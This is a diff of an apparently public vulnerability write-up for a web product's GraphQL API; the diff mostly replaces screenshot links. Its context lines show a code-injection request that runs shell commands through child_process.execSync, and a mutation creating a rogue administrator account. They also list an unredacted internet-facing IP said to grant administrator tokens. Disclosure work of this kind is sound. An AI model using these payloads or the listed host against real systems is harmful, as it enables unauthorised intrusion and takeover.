@@ -75,9 +75,13 @@ comparison — **the branch containing it is never executed**. That changes the
 audit question from "which check is wrong" to "which flags does the client
 control".
 
-![image-20261123205023413](./图片.assets/image-20261123205023413.png)
 
-![image-20261123205225668](./图片.assets/image-20261123205225668.png)
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/01ce6632-2936-405f-8718-ced294b07071" />
+
+
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/dcf4ed26-3591-41d3-96a6-2a3949f4452d" />
+
 
 ### 3.2 The default key is a public key
 
@@ -139,7 +143,9 @@ The resolver returns a JSON string:
 
 Replacing `fusername` authenticates as any other known account.
 
-![image-20261117113350758](./图片.assets/image-20261117113350758.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/73a45c80-1e2e-44d5-be1a-45c65ec89f5c" />
+
 
 ### 4.2 What the token grants
 
@@ -154,7 +160,9 @@ Content-Type: application/json
 {"query":"{getConnList(fconnids:\"(function(){var o=require('child_process').execSync(\\\"id && ip a && whoami\\\",{encoding:'utf8'}).toString();throw new Error('RCEOUT['+o+']')})()\")}","ftoken":"<token>","ftokenswarm":""}
 ```
 
-![image-20261117124414212](./图片.assets/image-20261117124414212.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/002fb568-85cd-4c53-94a6-eb4c5adbdfa2" />
+
 
 To demonstrate privilege without altering the administrator password, a new
 administrator account was created with `userAdd`:
@@ -167,7 +175,9 @@ Content-Type: application/json
 {"query":"mutation{userAdd(username:\"poc_test01\",userpassword:\"e10adc3949ba59abbe56e057f20f883e\",userrealname:\"poc\",fisadmin:true){username fisadmin userid}}","ftoken":"<token>","ftokenswarm":""}
 ```
 
-![image-20261117125429911](./图片.assets/image-20261117125429911.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/012fde20-99ba-4080-a99a-9a1a9ad46042" />
+
 
 ### 4.3 Affected deployments
 
@@ -181,25 +191,26 @@ The bypass reproduced on multiple internet-facing instances of the product.
 | `admin.<redacted>:8080` | `verify:true`, administrator token |
 | `222.78.251.54:10019` | `verify:true`, administrator token |
 
-![image-20261119203047624](./图片.assets/image-20261119203047624.png)
 
-![image-20261119203451469](./图片.assets/image-20261119203451469.png)
+<img width="2040" height="1346" alt="image" src="https://github.com/user-attachments/assets/acc6f0af-c299-468b-88e9-27a41ca82670" />
 
-![image-20261119203443437](./图片.assets/image-20261119203443437.png)
 
-![image-20261119203729480](./图片.assets/image-20261119203729480.png)
 
-![image-20261119203816804](./图片.assets/image-20261119203816804.png)
+<img width="2025" height="1395" alt="image" src="https://github.com/user-attachments/assets/1504dd83-aad0-4a1f-b849-e0b2e2b2ee1b" />
 
-![image-20261119203940473](./图片.assets/image-20261119203940473.png)
 
-![image-20261119203923271](./图片.assets/image-20261119203923271.png)
 
-![image-20261119204104638](./图片.assets/image-20261119204104638.png)
+<img width="2556" height="1539" alt="image" src="https://github.com/user-attachments/assets/2be7dc05-f564-45b3-a1eb-359c89e669de" />
 
-![image-20261119204048163](./图片.assets/image-20261119204048163.png)
 
-![image-20261117130059602](./图片.assets/image-20261117130059602.png)
+
+<img width="2043" height="1340" alt="image" src="https://github.com/user-attachments/assets/ea15f845-8d24-48a7-a1bc-7f893f2a7c54" />
+
+
+
+<img width="2553" height="1554" alt="image" src="https://github.com/user-attachments/assets/70463801-6434-41cb-a61d-86fe7631247e" />
+
+
 
 ## 5. Proof of concept
 
